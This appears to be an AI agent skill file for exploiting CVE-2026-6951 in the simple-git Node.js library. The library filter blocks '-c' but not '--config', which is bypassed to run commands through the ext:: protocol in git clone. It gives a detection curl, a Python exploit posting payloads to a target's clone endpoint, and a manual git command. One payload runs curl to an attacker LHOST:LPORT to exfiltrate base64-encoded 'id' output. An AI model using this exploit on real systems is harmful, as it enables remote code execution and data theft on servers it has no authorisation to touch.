---
name: simple-git-config-rce
description: "Use when simple-git npm lib. --config ext:: RCE."
---
# CVE-2026-6951 simple-git --config Option Filter Bypass → RCE

## Overview
simple-git < 3.28.0 (Node.js). Incomplete fix for CVE-2022-25912 — the library blocks `-c` but not `--config`, allowing `ext::` protocol for arbitrary command execution via `git clone`.

## Detection
```bash
# If app accepts git URLs for cloning:
curl <TARGET>/api/clone -d '{"url":"https://github.com/test/test"}'
# Look for simple-git in package.json or error messages
```

## Exploitation
```python
import requests

TARGET = '<TARGET>'
LHOST = '<LHOST>'
LPORT = '<LPORT>'

# --config allows setting protocol.ext.allow=always
# Then ext:: protocol executes arbitrary commands
payload = {
    'url': 'ext::sh -c curl${IFS}' + LHOST + ':' + LPORT + '/$(id|base64)% >&2',
    'options': ['--config', 'protocol.ext.allow=always']
}

# Alternative: if app passes raw git args
payload2 = {
    'repo': '--config=protocol.ext.allow=always',
    'url': 'ext::sh -c id% >&2'
}

requests.post(f'{TARGET}/api/clone', json=payload)
```

### Manual git command equivalent
```bash
git clone --config protocol.ext.allow=always \
  'ext::sh -c id% >&2' /tmp/pwn
```

## Pitfalls
- Only exploitable if user input reaches `git.clone()` options
- The `%` at end of ext:: command is required (git protocol marker)
- `>&2` redirects output to stderr (git captures stderr)
- CVE-2022-25912 fix only blocked `-c` short option, not `--config` long form
- Source: EQSTLab/CVE-2026-6951